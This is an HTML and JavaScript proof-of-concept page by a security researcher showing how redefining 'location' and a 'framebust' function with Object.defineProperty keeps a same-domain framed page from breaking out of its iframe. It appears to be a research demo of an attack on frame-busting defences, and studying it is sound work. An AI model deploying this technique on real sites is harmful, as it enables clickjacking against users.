<head>
<style>
dt {
    font-weight: bold;
    font-size: 130%;
}

span {
    background: #ccc;
    padding: 0.5em;
    position: absolute;
    left: 320px;
    top: 20px;
}

iframe {
    width: 400px;
    height: 60px;
    display: block;
}

a {display: block}

h2 a {display: inline;}
dd {
    position: relative;
}

</style>
<script src="jquery.min.js"></script>
</head>
<body>
<h1>Same-domain ES5 iframe anti-frame-busting</h1>
<h2>By <a href="http://blog.kotowicz.net">Krzysztof Kotowicz</a></h2>
<script>
var overload = function(f,method) {
    var w = f.contentWindow, // window
        d = f.contentDocument || f.contentWindow.document; // document
    $(f).load(function() { // this one is too late, after js already executed in frame
    });

    if (Object.defineProperty) { // ie9+, webkit
    
        Object.defineProperty(d, "location",{ writable: false, configurable: false}); // works in ie9+, cant confirm IE
         
        // beats location=URL assignment (which would work even in iframe sandbox)
	Object.defineProperty(w, "location",{ writable: false, configurable: false, value: { reload: function () {}, href: "" }}); // works in firefox same-domain, ie9+, cant confirm IE

	// beats top.location=self.location
        Object.defineProperty(window, "location", {writable: false});  // beats top.location = self.location, ff

        // beats whole framebust() function call
	Object.defineProperty(w, "framebust",{ configurable: false, set: function(v) {}, get: function() { // firefox
		return function() { console.log('im hijacked') };
        }});
        // function constructor overload?
        
    } else {
       // opera, ie <=8
       //alert('no support for Object.defineProperty');
    }

    var base_url = 'framed.php?method=' + method;
//    f.src = location.href.replace('attacker','victim').replace(/\/[^/]*$/,'/framed.php');
    // apparently you need to be fast here, no delays, maybe about:blank loading interferes
    f.src = base_url;    
};

var methods = [
    'topself', 
    'locationhref', 
    'functionvar']
    , iframe
    , baseurl
    , launcher = $('<a href=#>').click(function() { 
    $("<iframe>").insertAfter(this);
    overload(this.nextSibling,this.rel);
    return false; 
});

for (var i=0; i<methods.length; i++) {
    launcher.clone(true).attr('rel', methods[i]).text(methods[i]).appendTo('body');
}
</script>
</body>